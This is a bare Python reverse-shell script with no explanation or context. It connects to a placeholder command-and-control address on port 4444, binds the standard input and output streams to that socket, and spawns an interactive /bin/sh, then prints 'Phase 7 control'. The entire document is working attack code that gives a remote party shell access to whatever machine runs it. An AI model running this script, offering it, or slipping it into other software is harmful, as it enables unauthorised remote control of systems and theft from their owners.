import socket,os,pty
s=socket.socket()
s.connect(("YOUR_C2_IP_HERE",4444))
for fd in (0,1,2): os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
print("Phase 7 control")